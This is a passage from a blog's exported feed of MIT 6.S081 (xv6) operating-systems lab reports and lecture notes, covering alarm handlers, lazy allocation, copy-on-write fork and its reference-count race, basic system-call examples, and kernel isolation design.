<p>在触发时钟中断时，用户程序的上下文会被保存在 p-&gt;trapframe 中，但从回调函数再进入内核的时候，trapframe 里的上下文会被覆盖。要想对用户程序完全透明地执行这个过程，我们要在执行回调函数之前将原始上下文保存起来。因此我们需要在 proc 结构体中再定义一些变量用来保存原始上下文。笔者使用的一种简单的方法是定义一个 trapframe 结构体 u_trapframe，在进入回调函数之前将 p-&gt;trapframe 里的内容写到 u_trapframe 里。</p>
<p>此外 test2 中还测试了一种问题：我们在进入回调函数的时候，应该关闭 sigalarm() 设置的定时器。否则如果回调函数执行时间过长，在执行回调函数的过程中某一次时钟中断又触发定时器调用回调函数，就会陷入死递归。因此我们在 proc 结构体中还需要一个变量来记录当前是否是从回调函数中陷入内核态的。这个状态应该在前一次准备进入回调函数时置 1，在 sigreturn() 中清零。当该变量置 1 时，时钟中断不对计时器进行检查。</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lab 05: Lazy allocation</title>
    <url>/2022/02/03/MIT-6.S081%20Lab%2005%20-%20Lazy%20allocation/</url>
    <content><![CDATA[<h2 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h2><ul>
<li><input checked="" disabled="" type="checkbox"> Eliminate allocation from sbrk() (easy)</li>
<li><input checked="" disabled="" type="checkbox"> Lazy allocation (moderate)</li>
<li><input checked="" disabled="" type="checkbox"> Lazytests and Usertests (moderate)</li>
</ul>
<span id="more"></span>

<h2 id="Eliminate-allocation-from-sbrk-easy"><a href="#Eliminate-allocation-from-sbrk-easy" class="headerlink" title="Eliminate allocation from sbrk() (easy)"></a>Eliminate allocation from sbrk() (easy)</h2><p>该部分要做的事情很简单：在 <code>sbrk()</code> 系统调用的处理函数中，不要分配内存，只修改进程的 sz 即可。由于我们只修改了 sz 而没有为新申请的空间绑定页面，所以当用户程序使用这块内存的时候 (load/store指令)，就会因为页表无法翻译虚拟地址而报 kernel panic。</p>
<h2 id="Lazy-allocation-moderate"><a href="#Lazy-allocation-moderate" class="headerlink" title="Lazy allocation (moderate)"></a>Lazy allocation (moderate)</h2><p>在该部分需要做的修改和注意事项在课上基本讲过，可以参考 Lecture 08 的课堂笔记。总体来说，我们需要在 usertrap() 中识别出缺页异常并写一个缺页异常的处理函数：申请一个物理页面，将导致错误的虚拟地址所在的虚拟页面映射过去。此外，由于延迟分配的存在，我们在 uvmunmap() 时释放的不一定是已经映射过的地址，应当取消其中的一些 panic 语句。</p>
<h2 id="Lazytests-and-Usertests-moderate"><a href="#Lazytests-and-Usertests-moderate" class="headerlink" title="Lazytests and Usertests (moderate)"></a>Lazytests and Usertests (moderate)</h2><p>在该部分我们要额外处理 <code>sbrk()</code> 系统调用的一些细节：</p>
<ul>
<li><p>当 <code>sbrk()</code> 传入的参数是负数时，我们应当调用 uvmdealloc() 正常进行释放。uvmdealloc() 释放的虚拟页面可能已经映射了物理页面，可能还没有映射物理页面。我们在上一个部分中已经取消了 uvmunmap() 函数中对该内容的检查，所以没有问题。</p>
</li>
<li><p>当 <code>sbrk()</code> 进行了非法的操作，如引起错误的虚拟地址不在堆区范围内，或者内存不足、无法分配新物理页面，则杀死当前进程。</p>
</li>
<li><p>除了缺页异常中需要处理延迟分配的问题，<code>read()</code> / <code>write()</code> 系统调用中也要处理延迟分配问题。该系统调用的函数调用路径 (以 write() 为例) 为  sys_write() $\rightarrow$ filewrite() $\rightarrow$ writei() $\rightarrow$ either_copyin() $\rightarrow$ copyin() $\rightarrow$  walkaddr()。内核为了在内核空间和用户空间之间传递数据，会调用 copyin()/copyout()/copyinstr()。这些函数会抓着用户虚拟地址在用户页表中进行一次 page table walk，以翻译出其物理地址。该过程中可能会因为延迟分配的问题翻译失败，我们要判断这种情况，并进行分配，代码细节和 usertrap() 中的非常类似，但需要注意的是由于 usertests 的设置问题，<u>在 walkaddr() 中遇到非法情况不能直接杀死进程</u>。</p>
<p>  (注：事实上，如果将 lab pgtbl 中的代码添加进来，用户进程和内核共用一份页表，就可以由硬件完成所有的 page table walk，延迟分配的处理函数也只需要写一遍。)</p>
</li>
</ul>
<p>该实验中还有如下的几个细节：</p>
<ul>
<li>笔者查阅了一些网上的代码，发现它们处理 “用户栈地址” 的方式各不相同：有的人使用 p-&gt;kernel_sp，这实际上是进程的内核栈的栈顶地址。有的人使用 p-&gt;trapframe-&gt;sp，这是用户进程在陷入内核时的用户栈指针，由于用户栈此时不一定空，所以 p-&gt;trapframe-&gt;sp 并不一定指向栈底。从严谨的角度来说，获取栈底地址应该使用 <code>PGROUNDUP(p-&gt;trapframe-&gt;sp)</code>。笔者采用的另一种稍愚笨一些的方法为：在 proc 结构体中新建一个 ustack 变量，在 <code>exec()</code> 系统调用中把用户栈底的地址保存在其中。</li>
<li>该实验中对于边界情况的判断要格外小心，usertest 中有很多针对边界情况的测试。p-&gt;sz，即 program break，指向的是用户内存顶部的下一个地址，第一个未被使用的地址，因此判断合法范围时一定是 <code>va &lt; p-&gt;sz</code>。此外 <code>PGROUNDUP(p-&gt;trapframe-&gt;sp)</code> 得到的地址为用户栈底地址的下一位，因此下界一定是 <code>PGROUNDUP(p-&gt;trapframe-&gt;sp) &lt;= va</code> 。(usertest 中的 copyinstr3 测试了当参数字符串的结束符处于未分配空间时程序是否能返回 -1)</li>
</ul>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lab 06: Copy-on-write fork</title>
    <url>/2022/03/11/MIT-6.S081%20Lab%2006%20-%20Copy-on-write%20fork/</url>
    <content><![CDATA[<h2 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h2><ul>
<li><input checked="" disabled="" type="checkbox"> Implement copy-on write (hard)</li>
</ul>
<span id="more"></span>

<h2 id="Implement-Copy-on-Write"><a href="#Implement-Copy-on-Write" class="headerlink" title="Implement Copy-on Write"></a>Implement Copy-on Write</h2><p>写时拷贝 fork 的大体思路是：在 fork 时不为子进程创建新的页面，而是让子进程指向父进程的所有页面，并将页面的权限改为只读。将来如果某个进程 (父/子) 需要修改页面，会发生 page fault exception，在 kernel 的处理程序中，如果是 COW page，则新分配一个页面，将当前的只读页面内容复制过去，让当前进程的页表指向这个新的页面并将权限设置为可读可写。</p>
<h3 id="kalloc-kfree"><a href="#kalloc-kfree" class="headerlink" title="kalloc()/kfree()"></a>kalloc()/kfree()</h3><p>引入了 copy-on write 之后，一个物理页面可能会被多个进程的页表指向，这使得 kfree() 变得困难：某个进程被释放时，它拥有的物理页面不能被直接释放，否则别的进程就用不了这个页面了。我们需要为每个页面维护一个 reference count，只有一个页面的 reference count 为 0 了才能释放它。</p>
<p>维护 reference count 的时机很有讲究。笔者最初使用的方案是在“映射“和“解除映射”的时候修改 reference count，即在 mappages() 函数、 uvmunmap() 函数和 COW 相关函数中修改 reference count。但 xv6 中对 mappages() 的用法比较灵活，例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述 kvmmap() 会对所有的物理页面做一个恒等映射。其实内核并没有真正拥有这些页面，做 mappages() 时，真实分配好的页面是不存在的，在 kvmmap() 中做这一步只是为了简化内核代码的书写 (如在调用 memmove() 时不需要在软件中跑一遍内核页表)。因此如果在 mappages() 的时候维护 reference count，会得到不正确的结果。</p>
<p>一个合理的解决方案是在 COW 相关函数中增加 reference count，在 kfree() 中减少 reference count。kalloc() 中新出厂的页面默认 reference count 为 1。</p>
<h3 id="uvmcopy-uvmcow"><a href="#uvmcopy-uvmcow" class="headerlink" title="uvmcopy()/uvmcow()"></a>uvmcopy()/uvmcow()</h3><p>我们需要修改 uvmcopy() 的实现，不为子进程分配新的页面，而是让子进程指向父进程的页面，更新父进程的 reference count，并设置页表项的标志位。这里要注意的是，除了取消页面的 PTE_W，为了将 cow page 的异常和普通的越权修改异常区分开来，我们应当在页表项中标志一个 PTE_COW 位。RISC-V ISA 的页表项格式中，8，9,10 三位是 RSW 位，留给软件自由使用，我们可以利用这些位来标记 PTE_COW。</p>
<p>uvmcow() 是 COW 导致的 page fault exception 的处理函数。我们应当分配一个新页面，新页面没有 PTE_COW 位，有 PTE_W 位，将原始页面的内容复制过来，并修改当前进程的页表。</p>
<h3 id="Concurrency"><a href="#Concurrency" class="headerlink" title="Concurrency"></a>Concurrency</h3><p>该实验中我们要开始面对并发 bug。<code>/kernel/kalloc.c</code> 中的空闲页面链表是用 kmem.lock 保护起来的。与此同理，我们维护 reference count 的数组也应该用一把锁保护起来。我们当然可以使用 kmem.lock，但如果新建一把锁专门用于保护 reference count 数组 (甚至是每个 referenct count 的单元格) 可以获得更好的并行度。</p>
<p>Concurrency bug 中常见的一种是 TOCTTOU (time to check to time to use)。笔者曾经遇到过 xv6 在单核情况下可以正常运行，在多核情况下内存不够用的问题。经过排查发现问题出在如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (krref(pa) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    *pte |= PTE_W;</span><br><span class="line">    *pte &amp;= (~PTE_COW);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((mem = kalloc()) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">  flags &amp;= (~PTE_COW); flags |= (PTE_W);</span><br><span class="line">  memmove(mem, (<span class="keyword">void</span> *)pa, PGSIZE);</span><br><span class="line">  kmref(pa, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (mappages(pagetable, va, PGSIZE, (uint64)mem, flags) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的逻辑是：如果当前页面只剩一个 reference，就不必再申请新页面，而是直接修改一下本页面页表项的标志信息。否则当前页面有多个 reference，申请一个新页面并让当前进程指向它，调用 <code>kmref(pa,-1)</code> 更新原页面的 reference count。</p>
<p>这段代码的 bug 在于进入 else 分支后，<code>krref(pa)&gt;=2</code> 的假设不一定成立。假设有两个进程并发地执行该程序段且 pa 有且仅有两个 reference，那么两个进程都会通过 if 判断进入 else 分支，然后使用 kmref() 更新 reference count，这样 pa 页面的 reference count 变成了 0 但没有进程去 free 它，我们丢失了一个页面。这个 bug 触发次数越多，系统内可用的内存就越少。</p>
<p>想要修复这个 bug，一种选择是给整个 if 语句上锁，另一种选择是不使用 if 并把 kmref() 改成 kfree() 或 uvmunmap()。</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 01: Introduction and Examples</title>
    <url>/2022/01/25/MIT-6.S081%20Lecture%2001%20-%20Introduction%20and%20Examples/</url>
    <content><![CDATA[<h2 id="Purposes-of-O-S"><a href="#Purposes-of-O-S" class="headerlink" title="Purposes of O/S"></a>Purposes of O/S</h2><ul>
<li>Abstraction of hardware. Higher level interfaces and abstractions that applications can use can enhance convenience and portability (e.g. processes and file systems)</li>
<li>Multiplexing. Different applications can execute at the same time.</li>
<li>Isolation and sharing.</li>
<li>Security. Restrictions on resources applications have access to.</li>
<li>(Help applications to get) performance.</li>
<li>Range of different uses.</li>
</ul>
<span id="more"></span>

<h2 id="O-S-Organization"><a href="#O-S-Organization" class="headerlink" title="O/S Organization"></a>O/S Organization</h2><table>
<thead>
<tr>
<th>User:  VIM, CC, SHELL etc.</th>
</tr>
</thead>
<tbody><tr>
<td>Kernel: File system etc.<br>Processes, Memory allocations, Access control …</td>
</tr>
<tr>
<td>Hardware: CPU, RAM, DISK, NET etc.</td>
</tr>
</tbody></table>
<h2 id="API-Kernel"><a href="#API-Kernel" class="headerlink" title="API-Kernel"></a>API-Kernel</h2><p>Applications use API-kernel provided by Kernel to jump into Kernel. For example:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;out&quot;</span>, <span class="number">1</span>);	<span class="comment">// fd is the file descriptor</span></span><br><span class="line">write(fd, <span class="string">&quot;hello\n&quot;</span>, <span class="number">6</span>);</span><br><span class="line">pid = fork();			<span class="comment">// fork() API returns the descriptor of the newly created process</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Do high-level programming language like Python directly use system calls?</strong></p>
<p>Some high-level programming languages focus on portability - its code should be executable on different operating systems so usually they call library functions instead of directly using system calls to ensure its portability. Of course, theses languages provide methods for programmers to directly use system calls.</p>
</blockquote>
<blockquote>
<p><strong>How is jumping to kernel different from ordinary function calls?</strong></p>
<p>Kernel codes have direct access to sensitive information such as disks, so the privilege level should be carefully maintained during kernel jumping to ensure the safety of data.</p>
</blockquote>
<h2 id="Why-hard-interesting"><a href="#Why-hard-interesting" class="headerlink" title="Why hard/interesting?"></a>Why hard/interesting?</h2><ul>
<li><p>unforgiving environment: different from applications whose environment is provided by O/S, O/S is built directly on the hardware, which is harder.</p>
<p>  (In this course, QEMU is used to simulate CPU and corresponding hardwares.)</p>
</li>
<li><p>Tensions: there are some trade-offs. For example</p>
<ul>
<li>we want high efficiency so O/S should be close to the H/W, but to support applications we need a correct high-level abstraction.</li>
<li>We want powerful O/S services, but applications want simple interfaces.</li>
<li>We want flexible API, but for security reasons we need to have restraints.</li>
</ul>
</li>
<li><p>Interactions. For example,</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fd = open();</span><br><span class="line">pid = fork();</span><br></pre></td></tr></table></figure>

<p>  The semantic of <code>fork()</code> is to create a copy of the current process. The file descriptor <code>fd</code> we acquire at the first line should be accessible by the child process, so interactions between processes are needed.</p>
</li>
</ul>
<h2 id="Applications-using-system-calls-Examples"><a href="#Applications-using-system-calls-Examples" class="headerlink" title="Applications using system calls: Examples"></a>Applications using system calls: Examples</h2><h3 id="read-write"><a href="#read-write" class="headerlink" title="read() write()"></a><code>read()</code> <code>write()</code></h3><p>This is <code>copy.c</code>, we execute it on xv6:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// copy.c: copy input to output.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n = read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        write(<span class="number">1</span>, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>copy.c</code> ‘s function is that it prints on the screen whatever you input on the screen. Here 0/1 are the file descriptors of stdin/stdout (pervasive UNIX convention), which, in default, connect to the console input/output. Shell ensures that stdin/stdout have been opened when <code>copy.c</code> is being executed.</p>
<p>Here <code>copy.c</code> doesn’t check the return values of system calls for error (e.g. line 16). We should be more careful when coding.</p>
<blockquote>
<p><strong>What if we replace <code>sizeof(buf)</code> by 65?</strong></p>
<p>O/S will happily read at most 65 bytes from console input, but it may cause unexpected memory error. It’s a bug.</p>
</blockquote>
<h3 id="open"><a href="#open" class="headerlink" title="open()"></a><code>open()</code></h3><p>stdin and stdout are automatically opened, but we need a method to open files by ourselves, here’s another example program <code>open.c</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// open.c: create a file, write to it.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;output.txt&quot;</span>, O_WRONLY | O_CREATE);</span><br><span class="line">    write(fd, <span class="string">&quot;ooo\n&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After running <code>open</code>, we use <code>cat output.txt</code> to see the contents and we’ll get <code>ooo\n</code>. Here <code>fd</code> is the file descriptor indexing into a table inside the kernel. The kernel maintains a table for every running process and the table tells the kernel which file each file descriptor refers to. (NOTE: same file descriptor may refer to different files in different processes because the “table” is different.)</p>
<h3 id="fork"><a href="#fork" class="headerlink" title="fork()"></a><code>fork()</code></h3><p>This is <code>fork.c</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fork.c: create a new process</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    pid = fork();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fork() returned %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;child\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent\n&quot;</span>);</span><br><span class="line">  	</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>fork()</code> returns in both processes. In the original process, <code>fork()</code> returns a value greater than zero representing the pid of the child process. In the new process, <code>fork()</code> returns zero. Even if the two processes have the same memory, we can discriminate the parent from the child according to the return value of <code>fork()</code>.</p>
<p>The printed message is </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ffoorrkk(()) rreettuurrnende d <span class="number">0</span></span><br><span class="line"><span class="number">1</span>c9h</span><br><span class="line">ilpda</span><br><span class="line">rent</span><br></pre></td></tr></table></figure>

<p>It seems like messy code, but actually the two processes run at the same time and QEMU simulates a multi-core processor for us, so the two processes alternatively print information on the console.</p>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a><code>exec()</code></h3><p>When a command is typed into the shell, the shell forks a child process and use <code>exec()</code> system call to run the application in the child process. <code>exec()</code> loads the instructions in the file you specify over the current process, discards its current memory and starts executing those instructions.</p>
<p><code>fork()</code> and <code>exec()</code> are always used together to run an application, here is <code>forkexec.c</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// forkexec.c: fork then exec</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid, status;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;THIS&quot;</span>, <span class="string">&quot;IS&quot;</span>, <span class="string">&quot;ECHO&quot;</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        	<span class="comment">// Note: there should be a null pointer NULL/0 at the end of the array</span></span><br><span class="line">        exec(<span class="string">&quot;echo&quot;</span>, argv);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;exec failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent waiting\n&quot;</span>);</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        	<span class="comment">// the exit status of the child process will be recorded in variable status</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;the child exited with status %d\n&quot;</span>, status);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>If <code>echo</code> is executed successfully, it will print the arguments and use <code>exit(0)</code> to exit. If <code>echo</code> returns, which means something goes wrong, the child process will exit by <code>exit(1)</code> to tell the parent process about the error.</p>
<p>In lots of cases, <code>fork()</code> and <code>exec()</code> are used together. It seems that a lot of memory space is wasted because after <code>fork()</code> copies the memory of the parent process, <code>exec()</code> immediately discards it. But with the aid of virtual memory, we can use the tricky “copy on write” technique to solve the issue.</p>
<blockquote>
<p><strong>Is there any way for the child process to wait for the parent process?</strong></p>
<p>No.</p>
</blockquote>
<blockquote>
<p><strong>Will “parent waiting\n” always be printed first?</strong></p>
<p>Not necessary. The parent process and the child process execute concurrently so there outputs may interweave. However, because it takes a lot of machine instructions to discard the memory, load the memory and start <code>echo</code>, “parent waiting\n”, in most cases, will be printed first.</p>
</blockquote>
<blockquote>
<p><strong>How should we use <code>wait()</code> if there are more than one child processes?</strong></p>
<p>If there are 2 child processes, the parent process should use 2 <code>wait()</code> to wait for both of them to exit.</p>
</blockquote>
<h3 id="IO-Redirection"><a href="#IO-Redirection" class="headerlink" title="IO Redirection"></a>IO Redirection</h3><p>IO redirection can be achieved if we do something sophisticated between <code>fork()</code> and <code>exec()</code>. Here is <code>redirect.c</code>: </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// redirect.c: run a command with output redirected</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 	<span class="keyword">int</span> pid;</span><br><span class="line"></span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">		close(<span class="number">1</span>);</span><br><span class="line">		open(<span class="string">&quot;output.txt&quot;</span>, O_WRONLY|O_CREATE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;this&quot;</span>, <span class="string">&quot;is&quot;</span>, <span class="string">&quot;redirected&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        exec(<span class="string">&quot;echo&quot;</span>, argv);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;exec failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	wait((<span class="keyword">int</span> *) <span class="number">0</span>);</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In the child process, we firstly close file descriptor 1 and then open “output.txt”, the semantic of <code>open()</code> is to allocate the least file descriptor that is not being used to the file. Since 0 is still allocated to the console input, file descriptor 1 is allocated to output.txt and <code>echo</code> will output things into file 1, i.e. output.txt. It should be noticed that only the child process’s IO is redirected, the parent process, i.e. the shell process, stays the same.</p>
<p>The magical thing is that the application <code>echo</code> doesn’t need to know about the redirection - the only thing it knows is that it should output to file descriptor 1. This is abstraction.</p>
]]></content>
      <categories>
        <category>MIT-6.S081 Introduction to Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>MIT-6.S081 Lecture 03: OS Organization and System Calls</title>
    <url>/2022/01/26/MIT-6.S081%20Lecture%2003%20-%20OS%20Organization%20and%20System%20Calls/</url>
    <content><![CDATA[<h2 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h2><ul>
<li>We want strong isolation between applications so that if there’s a bug in one application, the others will not be damaged.</li>
<li>We also want isolation between applications and the operating system so that if weird arguments were passed to the OS, OS wouldn’t crash.</li>
</ul>
<span id="more"></span>

<p>Let’s consider what happens if there’s no operating system, a strawman design. In this case, several applications (e.g. <code>shell</code>, <code>echo</code> etc.) run on the hardware, there is no abstraction layer between H/W and applications. </p>
<ul>
<li><p>There’s a demand for switching between applications. Because there’s no OS, <code>shell</code> needs to proactively “give up” and “quit” the CPU to let others use the hardware. This is the so-called cooperating schedule. However, if there’s a dead loop in <code>shell</code> or <code>shell</code> is a malware, it will not quit and the hardware is completely occupied by this application. Therefore, we need a kind of “enforced multipliexing”: <strong>no matter what the application does, it will be forced to give up the CPU once in a while</strong>.</p>
</li>
<li><p>Different applications share the same memory space. For example, <code>shell</code>‘s memory may start at address 1000 and <code>echo</code>‘s memory may start at address 2000. There’s no boundary between their memory space and it’s easy for one application to overwrite others’ memory and cause tricky bugs.</p>
</li>
</ul>
<p>In summary, we need operating systems to <strong>enforce both multiplexing and strong memory isolation</strong>. Strawman design is not very common in today’s computer system. Some real-time system doesn’t have OS because applications trust each other, but in most cases we need OS to ensure isolation.</p>
<p>Unix inferfaces are sophisticated design. They abstracts the hardware resources and make isolation possible. For example,</p>
<ul>
<li>Process is the abstraction of CPU. Applications use <code>fork()</code> to create new processes, but it cannot assign a CPU core directly. How to schedule the processes on the CPU and how to arrange different CPU cores are the jobs of OS.</li>
<li><code>Exec</code> is the abstraction of memory. Application use <code>exec()</code> to load a new applications, during which it loads the <strong>memory image</strong> which describes the text, data segments etc. During execution, applications can use system calls like <code>sbrk()</code> to modify the memory image, but they cannot act directly on the physical memory. OS is responsible for allocating physical memory to the memory image.</li>
<li>File is the abstraction of disk blocks. Applications do operations on the files but they don’t have direct access to the physical storage device. They don’t know where the “file” is actually stored, which is the job belongs to OS.</li>
</ul>
<p>OS should be defensive: it should treat all the processes as malicious applications written by attackers and ensure that</p>
<ul>
<li>Apps cannot crash the OS.</li>
<li>Apps cannot break out of the isolation.</li>
</ul>
<p>Strong isolation is totally depend on the OS. The kernel is call “trusted computing base” (TCB). Kernels must have as few bugs as possible because any bug may be taken advantage of and becomes an exploit.</p>
<p>Strong isolation between applications and the OS are typically implemented by hardware support. Ususally there’re two: use/kernel mode and virtual memory.</p>
<h3 id="User-Kernel-mode"><a href="#User-Kernel-mode" class="headerlink" title="User/Kernel mode"></a>User/Kernel mode</h3><p>When running in kernel mode, CPU can execute privileged instructions which interact directly with CSRs e.g. setting up page table register, disable clock interrupts etc. </p>
<p>In user mode, CPU can only execute unprivileged instructions such as <code>add</code> <code>jmp</code> etc. There is a bit in the CSR to let hardware check which mode the current process/thread is in (0 for kernel, 1 for user). If the CPU decode one instruction, find out that it’s a privileged one and the mode bit is 1, it will deny executing the instruction. (Of course, the instruction for changing the mode bit is a privileged one.)</p>
<p>If a user application wants to execute privileged instructions, it should transfer from user mode to kernel mode first and let the kernel execute the instruction. </p>
<p>There is a method for applications to enter the kernel. In RISC-V, the instruction is <code>ecall</code>. The user store ssystem call number in a particular register and <code>ecall</code>, the PC jumps to a specific address in the kernel, and kernel checks the syetem call number, does security checks and jumps to corresponding service functions.</p>
<h3 id="Virtual-Memory"><a href="#Virtual-Memory" class="headerlink" title="Virtual Memory"></a>Virtual Memory</h3><p>Each process has its own page table: it maps virtual addresses to physical addresses. If the OS allocates different memory space to different processes, processes will not be able to access other processes’s memory space because those addresses are not in its page table. In this way, the OS provides strong memory isolation.</p>
<h2 id="Kernel-Design"><a href="#Kernel-Design" class="headerlink" title="Kernel Design"></a>Kernel Design</h2><p>An instant question is: since kernel should be TCB, what kind of code should be run in kernel mode? Most Unix-like operating system put the whole OS into the kernel mode(including xv6). This style is call monolithic kernel design. Though this design contains more code and increases the risk of having serious bugs, it’s helpful for tight integration between different modules (file system, virtual memory, processes etc.) and can achieve better performance.</p>
